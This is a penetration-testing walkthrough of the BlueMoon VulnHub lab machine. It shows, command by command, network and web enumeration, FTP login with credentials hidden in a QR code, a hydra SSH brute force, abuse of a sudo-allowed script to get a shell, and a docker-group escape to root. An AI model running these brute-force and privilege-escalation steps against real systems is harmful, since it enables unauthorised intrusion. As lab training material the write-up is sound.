## 📌 Overview
This report documents a full penetration testing process performed on the BlueMoon VulnHub machine. The objective is to identify vulnerabilities, gain access, escalate privileges, and capture all flags.

---

## 🖥️ Lab Setup
- Platform: VirtualBox  
- Attacker Machine: Kali Linux  
- Target Machine: BlueMoon (VulnHub)  
- Network: Host-Only / NAT Network  
<img width="800" height="600" alt="Check Bluemoon is on" src="https://github.com/user-attachments/assets/2bf0c07b-718f-405c-a784-463073f52624" />

---

## 🌐 1. Identify Attacker IP Address

```bash
ifconfig
```

Displays network interface details and confirms connectivity.
<img width="702" height="332" alt="Step 1 IfConfig" src="https://github.com/user-attachments/assets/97a79193-525a-4cfd-9b57-a3cf4fa58a81" />

---

## 🔍 2. Network Scanning

```bash
nmap -sn 192.168.56.0/24
```

Discovers active hosts in the network.

**Result:** Target IP → 192.168.56.101

<img width="567" height="258" alt="Step 2" src="https://github.com/user-attachments/assets/4fc37ef1-8ff2-4819-a9c6-2f3cdbbd6346" />

---

## 🧪 3. Service Enumeration

```bash
nmap -sV -p- 192.168.56.101
```

Finds open ports and services.

**Open Ports:**
- 21 (FTP)
- 22 (SSH)
- 80 (HTTP)

<img width="792" height="253" alt="Step 3" src="https://github.com/user-attachments/assets/9e206934-dcbc-4307-af21-54bda02f209b" />

---
<img width="1435" height="865" alt="Step 1 until 3 Result" src="https://github.com/user-attachments/assets/2e2dc424-3490-4a61-ada1-77adc7a65913" />

---
## 🌍 4. Web Enumeration

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Finds hidden directories.

**Result:** /hidden_text
<img width="872" height="370" alt="Step 4" src="https://github.com/user-attachments/assets/dc496945-0db3-4a1a-a230-0391daca0e30" />

---

## 🔐 5. Extract Credentials

- Navigate to /hidden_text
<img width="1435" height="865" alt="Step 4 Result" src="https://github.com/user-attachments/assets/597252fb-7759-4c72-8532-6bfb006a4dfd" />

- Download QR code
<img width="1435" height="865" alt="Step 4 Qr Result" src="https://github.com/user-attachments/assets/1a375a53-282c-4bf4-85b2-e81d993bbb1c" />

- Decode using online tool
<img width="992" height="712" alt="Step 4 Decode the Qr" src="https://github.com/user-attachments/assets/9cd5cf0a-f665-4431-bbea-4c6b7f3b3a88" />


**Credentials:**
- userftp / ftpp@ssword

---

## 📂 6. FTP Access

```bash
ftp 192.168.56.101
```
<img width="606" height="265" alt="Step 5" src="https://github.com/user-attachments/assets/65b2c861-e78c-44da-a311-7f2278257a66" />

Download files:
```bash
get information.txt
get p_lists.txt
```
<img width="1419" height="227" alt="Step 5 2" src="https://github.com/user-attachments/assets/67799988-b9b4-4207-9736-8e36fe1d08d7" />

---

## 📄 7. Analyze Files

```bash
cat information.txt
cat p_lists.txt
```
<img width="1014" height="124" alt="Step 9" src="https://github.com/user-attachments/assets/54de5371-d52f-4a71-a8bd-e833ff64fe57" />

<img width="237" height="555" alt="Step 10" src="https://github.com/user-attachments/assets/feac4c0f-c1e2-4d2d-944b-704f09c5b21d" />

---

## 🔓 8. SSH Brute Force

```bash
hydra -l robin -P p_lists.txt ssh://192.168.56.101
```

**Credentials Found:**
- robin / k4rv3ndh4nh4ck3r
<img width="1421" height="253" alt="Step 11" src="https://github.com/user-attachments/assets/21f82ba8-c02f-4646-b67d-0c09d2bf10c6" />

---

## 🔑 9. SSH Login

```bash
ssh robin@192.168.56.101
```
<img width="696" height="576" alt="Step 12" src="https://github.com/user-attachments/assets/772ec255-6423-4f9f-97f3-8c3b05941364" />

---

## 🏁 10. First Flag

```bash
cat user1.txt
```
<img width="375" height="134" alt="Step 13" src="https://github.com/user-attachments/assets/9ded1ff3-6d21-4ba3-901d-38aa8e42bdd0" />

---

## ⚙️ 11. Sudo Check

```bash
sudo -l
```
<img width="852" height="109" alt="Step 14" src="https://github.com/user-attachments/assets/42e169d2-99ec-4aa9-8ab5-37bcc0733341" />

---

## 💥 12. Exploit Script

```bash
sudo -u jerry /home/robin/project/feedback.sh
```

Input:
- jerry
- /bin/bash
<img width="449" height="123" alt="Step 19,20,21,22,23,24 (1)" src="https://github.com/user-attachments/assets/ff5e4066-8e06-4e42-b8dd-4d4c998ee47c" />

---

## 🏁 13. Second Flag

```bash
cd /home/jerry
cat user2.txt
```
<img width="449" height="316" alt="Step 19,20,21,22,23,24" src="https://github.com/user-attachments/assets/fc1f01ab-8d47-4f1e-9f75-aa8964829e43" />

---


## 🧾 14. Check Privileges

```bash
id
```

User is in docker group.

<img width="755" height="90" alt="Step 25 26" src="https://github.com/user-attachments/assets/3bdfd036-2cc1-4bad-b11d-f38a40fc41f3" />

---

## 🚀 16. Docker Privilege Escalation

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
<img width="540" height="121" alt="Step 27,28,29,30" src="https://github.com/user-attachments/assets/4573dfda-69e9-471e-b474-557f3a50d09c" />

---

## 👑 17. Root Access

```bash
id
```
<img width="861" height="184" alt="Step 31,32,33" src="https://github.com/user-attachments/assets/baf97aa7-5d43-46f0-be63-5b8849cc6b3f" />

---

## 🏁 18. Final Flag

```bash
cd /root
cat root.txt
```
<img width="407" height="421" alt="image" src="https://github.com/user-attachments/assets/49316abf-1a4b-4f16-b66f-97501a02a433" />

---

## 📊 Attack Summary

| Phase | Action |
|------|--------|
| Recon | Network scan |
| Enumeration | Ports & Web |
| Exploitation | FTP & SSH |
| Privilege Escalation | Sudo & Docker |
| Post Exploitation | Flags |

---

## ✅ Conclusion

The attack demonstrates full system compromise through enumeration, credential harvesting, brute-force attacks, and privilege escalation.
